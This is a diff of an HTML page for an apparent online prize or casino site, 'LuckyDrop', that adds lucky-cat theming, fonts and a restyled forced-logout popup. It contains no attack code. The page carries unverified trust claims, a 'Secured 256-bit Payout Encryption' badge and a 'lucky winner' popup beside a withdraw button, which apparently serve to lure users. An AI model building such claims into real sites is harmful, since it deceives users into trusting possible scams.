@@ -4,20 +4,25 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>LuckyDrop | Live Payout</title>
-    
+
     <!-- External Libraries -->
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
-    
+
     <!-- Google Fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">
-    
+    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;800;900&family=Orbitron:wght@700;900&family=Fredoka:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
     <!-- External CSS -->
     <link rel="stylesheet" href="styles/msheet.css">
 </head>
 <body>
+
+    <!-- ========== LUCKY CAT BACKGROUND EFFECTS ========== -->
+    <div class="bg-lucky-aura"></div>
+    <div class="bg-sparkles" id="bgSparkles"></div>
 
     <!-- Live Winner Ticker -->
     <div class="live-winner-box" id="winnerBox">
@@ -33,9 +38,22 @@
 
     <!-- Main Game Card -->
     <div class="card" id="mainCard">
+
+        <!-- Lucky Cat Mascot (header) -->
+        <div class="luckycat-header">
+            <div class="luckycat-ring">
+                <div class="luckycat-inner">
+                    <span class="luckycat-emoji">🐱</span>
+                    <div class="luckycat-bell">🔔</div>
+                </div>
+            </div>
+            <div class="luckycat-title">LUCKY DROP</div>
+            <div class="luckycat-subtitle">✦ Maneki-Neko Fortune ✦</div>
+        </div>
+
         <img src="images/casino.jpeg" class="casino-banner" onerror="this.style.display='none'">
-        <img src="images/logo1.png" class="logo-img">
-        
+        <img src="images/logo1.png" class="logo-img" onerror="this.style.display='none'">
+
         <!-- Game Grid (6 Cards) -->
         <div class="game-grid" id="grid">
             <div class="card-wrapper" data-card-id="1"><img src="images/img1.png" class="card-img"></div>
@@ -57,8 +75,8 @@
         </div>
 
         <!-- Status Label -->
-        <div id="statusLabel" style="font-size:12px; color:#fbbf24; margin-bottom:10px;">Initializing...</div>
-        
+        <div id="statusLabel" class="status-label">Initializing...</div>
+
         <!-- Withdraw Button -->
         <button class="btn-main" id="claimBtn">Withdraw Rewards</button>
 
@@ -69,7 +87,7 @@
             </svg>
             Secured 256-bit Payout Encryption
         </div>
-        
+
         <img src="images/casinoplus.jpeg" class="footer-img" onerror="this.style.display='none'">
     </div>
 
@@ -83,6 +101,7 @@
     <div id="claimPopup" class="claim-popup-overlay">
         <div class="claim-popup-card">
             <div class="popup-close-btn" onclick="hideClaimPopup()">✕</div>
+            <div class="popup-luckycat">🐱</div>
             <h2 class="congrats-title">🎉 CONGRATULATIONS! 🎉</h2>
             <div class="greeting">💎 YOU'RE A LUCKY WINNER! 💎</div>
             <div class="prize-amount-wrapper">
@@ -153,24 +172,24 @@
             }
             return 0;
         };
-        
+
         // ========== FIREWALL FUNCTIONS ==========
         window.showFirewallPopup = function() {
             const popup = document.getElementById('firewallPopup');
             if (popup) popup.style.display = 'flex';
         };
-        
+
         window.hideFirewallPopup = function() {
             const popup = document.getElementById('firewallPopup');
             if (popup) popup.style.display = 'none';
         };
     </script>
-    
+
     <!-- ========== FORCE LOGOUT LISTENER ========== -->
     <script>
         (function() {
             'use strict';
-            
+
             let logoutListenerRef = null;
             let forceLogoutPopupShown = false;
 
@@ -178,7 +197,6 @@
                 if (forceLogoutPopupShown) return;
                 forceLogoutPopupShown = true;
 
-                // Create overlay
                 const overlay = document.createElement('div');
                 overlay.style.cssText = `
                     position: fixed;
@@ -195,40 +213,40 @@
                     animation: fadeIn 0.4s ease;
                 `;
 
-                // Create card
                 const card = document.createElement('div');
                 card.style.cssText = `
-                    background: linear-gradient(145deg, #1a0a0a, #050505);
-                    border: 2px solid #d4af37;
-                    border-radius: 24px;
+                    background: linear-gradient(145deg, #2a0a0a, #0a0303);
+                    border: 3px solid #ffd700;
+                    border-radius: 28px;
                     padding: 35px 28px;
                     text-align: center;
                     max-width: 360px;
                     width: 85%;
-                    box-shadow: 0 0 50px rgba(212, 175, 55, 0.3);
+                    box-shadow: 0 0 60px rgba(255, 215, 0, 0.4), 0 25px 50px rgba(0,0,0,0.8);
                     animation: modalIn 0.3s ease;
                 `;
 
                 card.innerHTML = `
-                    <div style="font-size: 50px; margin-bottom: 15px;">⚠️</div>
-                    <h2 style="font-family: 'Orbitron', monospace; font-size: 20px; font-weight: 900; color: #fce883; margin-bottom: 10px;">SESSION ENDED</h2>
-                    <p style="font-family: 'Poppins', sans-serif; font-size: 13px; color: #bbb; line-height: 1.6; margin-bottom: 20px;">
+                    <div style="font-size: 60px; margin-bottom: 15px;">🐱</div>
+                    <h2 style="font-family: 'Fredoka', sans-serif; font-size: 22px; font-weight: 900; color: #ffd700; margin-bottom: 10px;">SESSION ENDED</h2>
+                    <p style="font-family: 'Fredoka', sans-serif; font-size: 14px; color: #ddd; line-height: 1.6; margin-bottom: 20px;">
                         Your session has been terminated by the administrator.<br><br>
                         Please login again to continue.
                     </p>
                     <button id="forceLogoutOkBtn" style="
                         width: 100%;
-                        background: linear-gradient(to bottom, #d4af37, #aa771c);
-                        border: 1px solid #fcf6ba;
-                        border-radius: 10px;
+                        background: linear-gradient(180deg, #ffd700, #ff9500);
+                        border: 3px solid #fff;
+                        border-radius: 14px;
                         padding: 14px;
-                        font-family: 'Orbitron', monospace;
-                        font-size: 14px;
+                        font-family: 'Fredoka', sans-serif;
+                        font-size: 15px;
                         font-weight: 800;
-                        color: #1a1100;
+                        color: #8b0000;
                         cursor: pointer;
-                        box-shadow: 0 4px 0 #6e4b0c;
+                        box-shadow: 0 5px 0 #8b4500, 0 8px 20px rgba(0,0,0,0.5);
                         transition: all 0.1s ease;
+                        letter-spacing: 2px;
                     ">OK</button>
                 `;
 
@@ -269,7 +287,6 @@
                 }
             }
 
-            // Add animations
             const style = document.createElement('style');
             style.textContent = `
                 @keyframes fadeIn {
@@ -283,7 +300,6 @@
             `;
             document.head.appendChild(style);
 
-            // Start listener
             if (document.readyState === 'loading') {
                 document.addEventListener('DOMContentLoaded', init);
             } else {
